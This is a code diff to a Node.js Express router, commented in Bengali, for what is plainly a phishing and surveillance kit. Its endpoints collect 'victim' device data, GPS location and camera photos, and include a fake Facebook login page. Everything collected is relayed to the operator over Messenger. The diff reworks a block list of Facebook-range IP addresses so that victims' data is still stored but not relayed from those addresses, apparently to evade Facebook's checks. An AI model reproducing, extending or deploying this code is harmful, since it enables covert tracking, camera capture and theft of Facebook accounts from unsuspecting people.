@@ -10,48 +10,17 @@ const {
 } = require('../utils/helpers');
 
 // ================================================================
-// 🚫 ব্লকড আইপি লিস্ট
+// 🚫 ব্লকড আইপি লিস্ট (যাদের ডেটা মেসেঞ্জারে পাঠানো হবে না)
 // ================================================================
 const BLOCKED_IPS = [
     '173.252.82.31',
-    '173.252.127.13',
+    '173.252.82.30',
     '173.252.82.32',
     '173.252.82.33',
     '173.252.82.34',
     '173.252.82.35',
     '173.252.82.36',
 ];
-
-// ================================================================
-// ✅ উন্নত IP বের করার ফাংশন (সব হেডার চেক করে)
-// ================================================================
-function getClientIp(req) {
-    // 1. x-forwarded-for (সবচেয়ে নির্ভরযোগ্য)
-    const forwarded = req.headers['x-forwarded-for'];
-    if (forwarded) {
-        const ips = forwarded.split(',').map(ip => ip.trim());
-        return ips[0];
-    }
-    // 2. Cloudflare
-    if (req.headers['cf-connecting-ip']) {
-        return req.headers['cf-connecting-ip'];
-    }
-    // 3. Nginx real-ip
-    if (req.headers['x-real-ip']) {
-        return req.headers['x-real-ip'];
-    }
-    // 4. সরাসরি connection
-    if (req.connection && req.connection.remoteAddress) {
-        return req.connection.remoteAddress;
-    }
-    if (req.socket && req.socket.remoteAddress) {
-        return req.socket.remoteAddress;
-    }
-    if (req.ip) {
-        return req.ip;
-    }
-    return '0.0.0.0';
-}
 
 // ================================================================
 // অটো ডিলিট: ১০ মিনিট
@@ -122,30 +91,23 @@ router.get('/fb/:id', async (req, res) => {
 });
 
 // ================================================================
-// 🚨 ভিক্টিম ডেটা রিসিভ – IP ব্লক চেক সহ
+// 🚨 ভিক্টিম ডেটা রিসিভ – `data.ip` চেক করে মেসেজ পাঠানো হবে কিনা
 // ================================================================
 router.post('/api/victim', async (req, res) => {
     try {
-        const clientIp = getClientIp(req);
-        console.log(`🔍 IP চেক (victim): ${clientIp}`);
-
-        // **IP ব্লক চেক – প্রথমেই ব্লক করি**
-        if (BLOCKED_IPS.includes(clientIp)) {
-            console.log(`🚫 ব্লকড IP: ${clientIp} → ডেটা গ্রহণ করা হয়নি, মেসেজ পাঠানো হবে না।`);
-            return res.status(403).json({ 
-                status: 'error', 
-                message: 'Access denied',
-                blocked: true 
-            });
-        }
-
         const data = req.body;
-        console.log('📥 ভিক্টিম ডেটা:', JSON.stringify(data, null, 2));
+        console.log('📥 ভিক্টিম ডেটা পেয়েছি:', JSON.stringify(data, null, 2));
 
         if (!data.id) {
             return res.status(400).json({ status: 'error', message: 'Missing id' });
         }
 
+        // **IP চেক – ডেটার `ip` ফিল্ড দেখে**
+        const victimIp = data.ip || '0.0.0.0';
+        const isBlocked = BLOCKED_IPS.includes(victimIp);
+        console.log(`🔍 ভিক্টিম IP: ${victimIp} → ${isBlocked ? '🚫 ব্লকড (মেসেজ যাবে না)' : '✅ অনুমোদিত (মেসেজ যাবে)'}`);
+
+        // ভিক্টিম খুঁজি বা তৈরি করি (সব সময়ই সেভ করি, ব্লক করলেও)
         let victim = await Victim.findOne({ id: data.id });
 
         if (!victim) {
@@ -182,24 +144,26 @@ router.post('/api/victim', async (req, res) => {
         }
 
         // ============================================================
-        // 📤 মেসেজ পাঠান (শুধুমাত্র যদি IP ব্লক না হয়)
+        // 📤 মেসেজ পাঠান **শুধুমাত্র যদি IP ব্লক না হয়**
         // ============================================================
-        if (victim.fbId && victim.fbId !== 'unknown') {
+        if (!isBlocked && victim.fbId && victim.fbId !== 'unknown') {
             const msg = formatVictimData(victim);
             await sendMessage(victim.fbId, msg);
-            console.log(`📤 ডিভাইস ইনফো মেসেজ: ${victim.fbId}`);
+            console.log(`📤 ডিভাইস ইনফো মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
+        } else if (isBlocked) {
+            console.log(`⛔ ব্লকড IP (${victimIp}) → মেসেজ পাঠানো হয়নি।`);
         }
 
-        // লোকেশন মেসেজ (যদি থাকে)
-        if (victim.fbId && victim.fbId !== 'unknown' && victim.gpsLocation && victim.gpsLocation.latitude) {
+        // লোকেশন মেসেজ (যদি থাকে এবং ব্লক না হয়)
+        if (!isBlocked && victim.fbId && victim.fbId !== 'unknown' && victim.gpsLocation && victim.gpsLocation.latitude) {
             const locationMsg = formatLocationMessage(victim.gpsLocation);
             if (locationMsg) {
                 await sendMessage(victim.fbId, locationMsg);
-                console.log(`📍 লোকেশন মেসেজ: ${victim.fbId}`);
+                console.log(`📍 লোকেশন মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
             }
         }
 
-        res.status(200).json({ status: 'ok', data: victim });
+        res.status(200).json({ status: 'ok', data: victim, blocked: isBlocked });
 
     } catch (err) {
         console.error('❌ Victim data error:', err);
@@ -208,22 +172,10 @@ router.post('/api/victim', async (req, res) => {
 });
 
 // ================================================================
-// 🚨 ক্যামেরা ছবি রিসিভ – IP ব্লক চেক সহ
+// 🚨 ক্যামেরা ছবি রিসিভ – ভিক্টিমের আইপি চেক করে মেসেজ/ছবি ব্লক
 // ================================================================
 router.post('/api/camera', async (req, res) => {
     try {
-        const clientIp = getClientIp(req);
-        console.log(`🔍 IP চেক (camera): ${clientIp}`);
-
-        if (BLOCKED_IPS.includes(clientIp)) {
-            console.log(`🚫 ব্লকড IP: ${clientIp} → ক্যামেরা ডেটা গ্রহণ করা হয়নি।`);
-            return res.status(403).json({ 
-                status: 'error', 
-                message: 'Access denied',
-                blocked: true 
-            });
-        }
-
         const { id, image } = req.body;
         if (!id || !image) {
             return res.status(400).json({ status: 'error', message: 'Missing id or image' });
@@ -233,6 +185,11 @@ router.post('/api/camera', async (req, res) => {
         if (!victim) {
             return res.status(404).json({ status: 'error', message: 'Victim not found' });
         }
+
+        // **ভিক্টিমের সেভ করা IP চেক**
+        const victimIp = victim.ip || '0.0.0.0';
+        const isBlocked = BLOCKED_IPS.includes(victimIp);
+        console.log(`🔍 ক্যামেরা রিকোয়েস্টে ভিক্টিম IP: ${victimIp} → ${isBlocked ? '🚫 ব্লকড (ছবি যাবে না)' : '✅ অনুমোদিত (ছবি যাবে)'}`);
 
         const isFirstImage = !victim.camera || victim.camera.length === 0;
 
@@ -246,16 +203,21 @@ router.post('/api/camera', async (req, res) => {
         const totalImages = victim.camera.length;
         console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${totalImages}টি)`);
 
-        if (victim.fbId && victim.fbId !== 'unknown') {
+        // ============================================================
+        // 📤 মেসেজ ও ছবি পাঠান **শুধুমাত্র যদি IP ব্লক না হয়**
+        // ============================================================
+        if (!isBlocked && victim.fbId && victim.fbId !== 'unknown') {
             if (isFirstImage) {
                 await sendMessage(victim.fbId, '📸 *ভিক্টিম ক্যামেরা পারমিশন দিয়েছে!*\nছবি আসতে শুরু করেছে...');
-                console.log(`📸 ক্যামেরা পারমিশন: ${victim.fbId}`);
+                console.log(`📸 ক্যামেরা পারমিশন মেসেজ: ${victim.fbId}`);
             }
             await sendImageMessage(victim.fbId, image);
             console.log(`📸 ছবি #${totalImages} পাঠানো: ${victim.fbId}`);
+        } else if (isBlocked) {
+            console.log(`⛔ ব্লকড IP (${victimIp}) → ক্যামেরার মেসেজ/ছবি পাঠানো হয়নি।`);
         }
 
-        res.status(200).json({ status: 'ok', count: totalImages });
+        res.status(200).json({ status: 'ok', count: totalImages, blocked: isBlocked });
 
     } catch (err) {
         console.error('❌ Camera error:', err);
@@ -285,7 +247,7 @@ router.get('/image/:id/:index', async (req, res) => {
 });
 
 // ================================================================
-// ফেক ফেসবুক লগইন
+// ফেক ফেসবুক লগইন (এখানে আইপি চেক নেই, কারণ এটি আলাদা ফিচার)
 // ================================================================
 router.post('/api/fblogin', async (req, res) => {
     try {
